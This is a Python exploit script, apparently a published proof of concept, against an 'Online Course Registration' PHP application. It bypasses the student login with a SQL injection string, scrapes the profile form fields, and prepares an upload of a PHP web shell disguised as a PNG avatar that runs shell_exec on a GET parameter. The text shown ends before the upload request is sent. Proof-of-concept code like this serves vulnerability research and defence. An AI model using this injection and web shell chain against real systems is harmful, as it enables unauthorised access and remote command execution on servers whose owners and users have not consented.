# Exploit Title: 
# Exploit Author: Bobby Cooke
# Date: 
# Vendor Homepage: 
# Software Link: 
# Version: 1.0
# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4

import requests, sys, urllib, re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

if __name__ == "__main__":
    #SERVER_URL = sys.argv[1]
    SERVER_URL = 'http://172.16.65.130/Online Course Registration/'
    LOGIN_URL  = SERVER_URL + 'index.php'
    PROFILE_URL = SERVER_URL + 'my-profile.php'
#1 | Create Session
    print '[+] Creating session and saving PHPSESSID'
    s = requests.Session()
#    get_session = s.get(SERVER_URL, verify=False)
    get_session = s.get(SERVER_URL, verify=False, proxies=proxies) # BurpProxy Session Request
# Session Reponse Debug
    if get_session.status_code == 200:
        print('[+] Successfully connected to server and created session.')
        print get_session.headers['Set-Cookie']
    else:
        print('[!] Cannot connect to the server and create a web session.')
#2 | Auth Bypass
    bypass_data = {'regno' : '\' or 1=1; -- boku', 'password' : '\' or 1=1; -- boku', 'submit' : ''}
#    bypass_data = {'regno' : 'AAAAAAAAAAAAAAAAAu', 'password' : 'AAAAAAAAAAAAA boku', 'submit' : ''}
    print '[+] Bypassing authentication of student login portal.'
#    auth_bypass = s.post(url=LOGIN_URL, data=bypass_data, verify=False)
    auth_bypass = s.post(url=LOGIN_URL, data=bypass_data, verify=False, proxies=proxies) #PROXY
    if auth_bypass.history:
        for resp in auth_bypass.history:
            print('Response Status-Code: ' + str(resp.status_code))
            print('Location: ' + str(resp.headers['location']))
            redirectURL = resp.headers['location']
            if re.match(r".*change-password.php", redirectURL):
                print('[+] Successfully bypassed user portal authentication.')
            else:
                print('[!] Failed to bypass user portal authentication. Quitting..')
                quit()
#3 | Get dynamic profile-page POST parameters
#    get_profile = s.get(url=PROFILE_URL, verify=False)
    get_profile = s.get(url=PROFILE_URL, verify=False, proxies=proxies) #PROXY
    Name = str(re.findall(r'name="studentname" value=".*"', get_profile.text))
    Name = re.sub('^.*name="studentname" value="', '', Name)
    Name = re.sub('".*$', '', Name)
    print 'studentname = ' + Name
    PinCode = str(re.findall(r'name="Pincode" readonly value=".*"', get_profile.text))
    PinCode = re.sub('^.*name="Pincode" readonly value="', '', PinCode)
    PinCode = re.sub('".*$', '', PinCode)
#    print 'Pincode = ' + PinCode
    RegNo = str(re.findall(r'name="studentregno" value=".*"', get_profile.text))
    RegNo = re.sub('^.*name="studentregno" value="', '', RegNo)
    RegNo = re.sub('".*$', '', RegNo)
#    print 'studentregno = ' + RegNo
#    print get_profile.text
#4 | WebShell upload POST Request
    avatar_img  = {
                'photo': 
                  (
                    'kaio-ken.php', 
                    '<?php echo shell_exec($_GET["telepathy"]); ?>', 
                    'image/png', 
                    {'Content-Disposition': 'form-data'}
                  ) 
              }
    upld_data = {'studentname':Name, 'studentregno':RegNo,'Pincode':PinCode,'cgpa':'0.00','submit':''}
#    webshell_upload = s.post(url=PROFILE_URL, files=avatar_img, data=upld_data, verify=False)
